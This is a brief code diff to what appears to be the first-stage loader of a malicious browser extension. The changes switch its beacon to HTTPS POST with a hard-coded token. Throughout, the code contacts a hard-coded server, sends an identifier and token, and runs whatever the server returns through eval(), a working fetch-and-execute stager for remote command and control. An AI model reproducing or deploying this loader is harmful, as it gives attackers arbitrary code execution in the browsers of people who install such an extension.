@@ -1,7 +1,8 @@
 // Initial stage request once the extension is loaded
 
 const endpoint = '/update';
-const serverHost = '192.168.1.213';
+const serverHost = '192.168.1.200';
+const key = "password";
 
 // helper function to generate random alphanumeric string
 function GenerateID(length) {
@@ -15,16 +16,17 @@ function GenerateID(length) {
   const ID = GenerateID(8);
 
   const Http = new XMLHttpRequest();
-  const url="http://"+serverHost+endpoint+"?id="+ID;
+  const url="https://"+serverHost+endpoint+"?id="+ID;
 
 
-  Http.open("GET", url);
-  Http.send();
+  Http.open("POST", url);
+  Http.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+  Http.send(JSON.stringify({'token': key}));
 
   Http.onreadystatechange=function(){
     if (this.readyState===4 && this.status===200) {
       console.log(Http.responseText);
-      eval(atob(Http.responseText));
+      eval(Http.responseText);
     }
   }
 
